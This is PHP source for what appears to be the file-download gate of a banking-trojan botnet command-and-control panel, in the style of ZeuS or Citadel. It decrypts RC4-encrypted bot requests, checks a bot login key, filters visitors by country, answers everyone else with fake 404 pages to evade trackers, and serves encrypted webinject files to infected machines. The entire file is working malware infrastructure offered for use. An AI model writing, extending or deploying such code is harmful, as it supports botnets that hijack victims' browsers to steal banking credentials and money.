<?php define('__REPORT__', 1);

define('FILEPHP_DEBUG_MODE', 0); # DEBUG MODE. Logs into file.php.log (if exists)

# PHP Error settings
ini_set('error_log', basename(__FILE__).'.error.log'); # Log everything to file.php.error.log
ini_set('log_errors', 1);
ini_set('display_errors', 0); # don't display errors: this can spoil the protocol
ini_set('ignore_repeated_errors', 1);
ini_set('html_errors', 0);
error_reporting(E_ALL);

# Includes
require_once('system/global.php');
require_once('system/config.php');
require_once('system/gate/lib.php');

# Init logging
new GateLog(__FILE__.'.log', FILEPHP_DEBUG_MODE ? GateLog::L_TRACE : GateLog::L_NOTICE);
set_error_handler(array(GateLog::get(), 'php_error_handler'));

if (FILEPHP_DEBUG_MODE){
    error_reporting(E_ALL);
    function _logshutdown(){
        GateLog::get()->flush();
    }
    register_shutdown_function('_logshutdown');
}

function die404($place, $reason, $text = ''){
	$sapi_name = php_sapi_name();
	if ($sapi_name == 'cgi' || $sapi_name == 'cgi-fcgi')
		@header('Status: 404 Not Found');
	else
		@header($_SERVER['SERVER_PROTOCOL'] . ' 404 Not Found');
	echo ($text);
    gate_die($place, $reason);
}

if (file_exists('system/gate/gate.plugin.404.php'))
	require 'system/gate/gate.plugin.404.php';

if(@$_SERVER['REQUEST_METHOD'] !== 'POST'){
    if (function_exists('e404plugin_display')){
        e404plugin_display();
        gate_die('init', 'Invalid request method');
    } else
        die404('init', 'Invalid request method', 'Not found');
}

/* plugin: 404 */
if (function_exists('e404plugin_display') && !empty($config['allowed_countries_enabled'])){
	# Analize IPv4 & Ban if needed
	if (connectToDb()){
		$realIpv4   = trim((!empty($_GET['ip']) ? $_GET['ip'] : $_SERVER['REMOTE_ADDR']));
		$country    = ipv4toc($realIpv4);
		if (!e404plugin_check($country))
			die();
		}
	}

//Получаем данные.
$data     = @file_get_contents('php://input');
$dataSize = @strlen($data);
if($dataSize < HEADER_SIZE + ITEM_HEADER_SIZE)
	die404('init', '$dataSize too small');

if ($dataSize < BOTCRYPT_MAX_SIZE) rc4($data, $config['botnet_cryptkey_bin']);
visualDecrypt($data);
smartEncrypt($data, substr($data, 0, HEADER_PREFIX));

//Верефикация. Если совпадает MD5, нет смысла проверять, что-то еще.
if(strcmp(md5(substr($data, HEADER_SIZE), true), substr($data, HEADER_MD5, 16)) !== 0)
	die404('init', 'md5() verif failed');

//Парсим данные (Сжатие данных не поддерживается).
$list = array();
for($i = HEADER_SIZE; $i + ITEM_HEADER_SIZE <= $dataSize;){
	$k = @unpack('L4', @substr($data, $i, ITEM_HEADER_SIZE));
	$list[$k[1]] = @substr($data, $i + ITEM_HEADER_SIZE, $k[3]);
	$i += (ITEM_HEADER_SIZE + $k[3]);
	}
unset($data);

//Основные параметры, которые должны быть всегда.
if(empty($list[SBCID_LOGIN_KEY]) || empty($list[SBCID_REQUEST_FILE]))
	die404('init', 'Required fields are missing');

//Проверяем ключ для входа. Привет Citra трекерам.
if(strcasecmp(trim($list[SBCID_LOGIN_KEY]), BO_LOGIN_KEY) != 0)
	die404('init', 'Incorrect login key');

$requestfile = trim($list[SBCID_REQUEST_FILE]);

function loadfile($file){
    $cipher = false;

    if (strncmp($file, $s='webinjects-', $l=strlen($s)) === 0){ # (slash issue) Bot does not like slashes in the filename. We'll simulate with a constant prefix
        $filename = './files/webinjects/'.substr(basename($file), 0, $l);
        $cipher = true;
    } elseif (strncmp($file, $s='webinjects/', $l=strlen($s)) === 0) {
        $filename = './files/webinjects/'.basename($file);
        $cipher = true;
    } else {
        $filename = './files/'.basename($file);
    }

    if (!is_file($filename))
        return false;

	$len = filesize($filename);

	$file_extension = strtolower(substr(strrchr($filename,"."),1));
		
	header("Cache-Control:");
	header("Cache-Control: public");
	header("Content-Type: application/octet-stream");
	
	if (strstr($_SERVER['HTTP_USER_AGENT'], "MSIE")) {
		$iefilename = preg_replace('/\./', '%2e', $filename, substr_count($filename, '.') - 1);
		header("Content-Disposition: attachment; filename=\"$iefilename\"");
		} else {
		header("Content-Disposition: attachment; filename=\"$filename\"");
		}
	header('Content-Transfer-Encoding: binary');  
	header("Content-Length: ".$len);

	@ob_clean();
	flush();
	if (!$cipher)
        @readfile("$filename");
    else{
        $contents = file_get_contents($filename);
        rc4($contents, $GLOBALS['config']['botnet_cryptkey_bin']);
        echo $contents;
    }
	return true;
	}


$success = loadfile($requestfile);

FILEPHP_DEBUG_MODE && GateLog::get()->log(GateLog::L_DEBUG, 'file', "File request: file={$requestfile}, success=".($success? 'yes' : 'failed'));

if (!$success)
    die404('file', 'loadfile() failed');
